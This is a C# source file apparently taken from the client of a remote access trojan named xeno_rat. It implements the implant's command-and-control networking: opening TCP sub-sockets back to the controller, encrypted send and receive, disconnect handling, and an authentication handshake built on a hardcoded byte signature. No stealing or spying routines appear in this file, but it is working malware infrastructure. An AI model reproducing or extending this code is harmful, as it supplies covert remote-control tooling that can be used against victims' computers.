using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    public class Node
    {

        /// <summary>
        /// Compares two byte arrays and returns an integer that indicates their relationship in terms of order.
        /// </summary>
        /// <param name="b1">The first byte array to be compared.</param>
        /// <param name="b2">The second byte array to be compared.</param>
        /// <param name="count">The number of bytes to compare.</param>
        /// <returns>An integer that indicates the relationship between the two byte arrays.
        /// Returns 0 if the contents of the arrays are equal, a value less than 0 if the first differing byte in b1 is less than the corresponding byte in b2,
        /// and a value greater than 0 if the first differing byte in b1 is greater than the corresponding byte in b2.</returns>
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);
        
        private Action<Node> OnDisconnect;
        public List<Node> subNodes = new List<Node>();
        public SocketHandler sock;
        public Node Parent;
        public int ID = -1;
        public int SetId = -1;
        public int SockType = -1;
        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
        {
            sock = _sock;
            OnDisconnect = _OnDisconnect;
        }

        /// <summary>
        /// Adds a sub-node to the current node.
        /// </summary>
        /// <param name="subNode">The sub-node to be added.</param>
        /// <remarks>
        /// This method adds the specified sub-node to the list of sub-nodes associated with the current node.
        /// </remarks>
        public void AddSubNode(Node subNode) 
        {
            subNodes.Add(subNode);
        }

        /// <summary>
        /// Disconnects the current socket and clears the subNodes list, and invokes the OnDisconnect event if it is not null.
        /// </summary>
        /// <remarks>
        /// This method asynchronously disconnects the current socket using Task.Factory.FromAsync method, and then clears the subNodes list and disconnects each subNode recursively.
        /// If an exception occurs during the disconnection process, the socket is closed and disposed.
        /// </remarks>
        public async void Disconnect()
        {
            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock.sock?.Close(0);
            }
            sock.sock?.Dispose();
            List<Node> copy = subNodes.ToList();
            subNodes.Clear();
            foreach (Node i in copy)
            {
                i?.Disconnect();
            }
            copy.Clear();
            if (OnDisconnect != null)
            {
                OnDisconnect(this);
            }
        }

        /// <summary>
        /// Asynchronously connects a sub socket and sets up the connection with the specified parameters.
        /// </summary>
        /// <param name="type">The type of the socket connection.</param>
        /// <param name="retid">The return ID for the connection.</param>
        /// <param name="OnDisconnect">An optional action to be performed on disconnection.</param>
        /// <returns>A Node representing the connected sub socket.</returns>
        /// <remarks>
        /// This method creates a new socket with the specified address family, socket type, and protocol type.
        /// It then asynchronously connects to the remote endpoint of the socket.
        /// After successful connection, it sets up the connection using the Utils.ConnectAndSetupAsync method with the provided encryption key, type, and ID.
        /// It then sends the return ID to the connected sub socket and returns the sub socket.
        /// If an exception occurs during the process, a byte array with value 0 is sent asynchronously and null is returned.
        /// </remarks>
        /// <exception cref="Exception">Thrown if an error occurs during the connection and setup process.</exception>
        public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> OnDisconnect = null)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                await socket.ConnectAsync(sock.sock.RemoteEndPoint);

                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.EncryptionKey, type, ID, OnDisconnect);
                byte[] byteRetid = new byte[] { (byte)retid };
                await sub.SendAsync(byteRetid);
                byte[] worked = new byte[] { 1 };
                await SendAsync(worked);
                return sub;
            }
            catch
            {
                byte[] worked = new byte[] { 0 };
                await SendAsync(worked);
                return null;
            }
        }

        /// <summary>
        /// Checks if the socket is connected and returns a boolean value indicating the connection status.
        /// </summary>
        /// <returns>True if the socket is connected; otherwise, false.</returns>
        /// <remarks>
        /// This method checks the connection status of the socket and returns a boolean value indicating whether the socket is connected or not.
        /// If an exception occurs during the check, the method returns false.
        /// </remarks>
        public bool Connected() 
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Asynchronously receives data from the socket and returns the received data as a byte array.
        /// </summary>
        /// <returns>The received data as a byte array. Returns null if the received data is null, and disconnects the socket.</returns>
        /// <exception cref="Exception">Thrown when there is an issue with receiving data from the socket.</exception>
        /// <remarks>
        /// This method asynchronously receives data from the socket using the ReceiveAsync method and returns the received data as a byte array.
        /// If the received data is null, the method disconnects the socket and returns null.
        /// </remarks>
        public async Task<byte[]> ReceiveAsync()
        {
            byte[] data = await sock.ReceiveAsync();
            if (data == null)
            {
                Disconnect();
                return null;
            }
            return data;
        }

        /// <summary>
        /// Asynchronously sends the specified data over the socket connection.
        /// </summary>
        /// <param name="data">The byte array containing the data to be sent.</param>
        /// <returns>A <see cref="Task{TResult}"/> representing the asynchronous operation. The task result is <see langword="true"/> if the data was sent successfully; otherwise, <see langword="false"/>.</returns>
        /// <exception cref="SocketException">Thrown when an error occurs during the socket operation.</exception>
        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                Disconnect();
                return false;
            }
            return true;
        }

        /// <summary>
        /// Compares two byte arrays and returns true if they are equal, otherwise returns false.
        /// </summary>
        /// <param name="b1">The first byte array to be compared.</param>
        /// <param name="b2">The second byte array to be compared.</param>
        /// <returns>True if the byte arrays are equal in length and content, otherwise false.</returns>
        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }

        /// <summary>
        /// Sets the receive timeout for the socket.
        /// </summary>
        /// <param name="ms">The receive timeout value in milliseconds.</param>
        /// <remarks>
        /// This method sets the receive timeout for the underlying socket to the specified value in milliseconds.
        /// A receive timeout value of 0 indicates an infinite timeout.
        /// </remarks>
        public void SetRecvTimeout(int ms) 
        {
            sock.SetRecvTimeout(ms);
        }

        /// <summary>
        /// Resets the receive timeout for the socket.
        /// </summary>
        /// <remarks>
        /// This method resets the receive timeout for the underlying socket to the default value.
        /// </remarks>
        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }

        /// <summary>
        /// Authenticates the connection based on the specified type and optional ID.
        /// </summary>
        /// <param name="type">The type of authentication. 0 for main, 1 for heartbeat, 2 for anything else.</param>
        /// <param name="id">The optional ID for authentication. Defaults to 0.</param>
        /// <returns>A boolean value indicating whether the authentication was successful.</returns>
        /// <remarks>
        /// This method asynchronously authenticates the connection based on the specified type and optional ID.
        /// It sets a receive timeout of 5000 milliseconds, receives data from the socket, sends the received data back, and resets the receive timeout.
        /// If the received data matches a predefined byte array, it further processes the authentication based on the type.
        /// If the type is 0, it receives data from the socket to obtain a connection ID and sets the ID property.
        /// If the type is not 0, it sets the ID property with the specified ID and sends the ID back to the socket.
        /// The method returns true if the authentication is successful; otherwise, it returns false.
        /// </remarks>
        public async Task<bool> AuthenticateAsync(int type, int id = 0)//0 = main, 1 = heartbeat, 2 = anything else
        {
            byte[] data;
            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
            try
            {
                sock.SetRecvTimeout(5000);
                data = await sock.ReceiveAsync();
                if (!await sock.SendAsync(data))
                {
                    return false;
                }
                data = await sock.ReceiveAsync();
                sock.ResetRecvTimeout();
                if (ByteArrayCompare(comp, data))
                {
                    byte[] _SockType = sock.IntToBytes(type);
                    if (!(await sock.SendAsync(_SockType)))
                    {
                        return false;
                    }
                    if (type == 0)
                    {
                        data = await sock.ReceiveAsync();
                        int connId = sock.BytesToInt(data);
                        ID = connId;
                    }
                    else
                    {
                        ID = id;
                        byte[] connId = sock.IntToBytes(id);
                        if (!(await sock.SendAsync(connId)))
                        {
                            return false;
                        }
                    }
                    SockType = type;
                    return true;
                }
            }
            catch
            {

            }
            return false;
        }
    }
}
